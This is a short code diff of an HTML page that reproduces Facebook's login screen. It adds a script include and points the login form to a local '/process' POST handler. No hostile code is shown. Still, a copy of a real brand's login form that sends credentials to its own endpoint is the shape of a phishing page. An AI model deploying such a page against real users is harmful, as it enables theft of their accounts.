@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/x-icon" href="assets/favicon.png">
     <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
     <title>Facebook – log in or sign up</title>
 </head>
 <body class="flex justify-center items-center h-screen bg-[#f0f2f5]">
@@ -14,7 +15,7 @@
         <p class="text-2xl">Facebook helps you connect and share <br class="hidden lg:block"> with the people in your life.</p>
     </section>
     <section id="form" class="h-2/3 lg:h-auto lg:w-[37%]">
-        <form action="process.js" class=" bg-white p-2 px-3 rounded-md shadow-xl lg:p-3" method="post">
+        <form action="/process" class=" bg-white p-2 px-3 rounded-md shadow-xl lg:p-3" method="post">
             <div class="form-group">
                 <input type="email" class="outline-input-focus w-full border border-gray-300 p-3 rounded-md my-2" name="email" id="email" placeholder="Email address or phone number">
             </div>
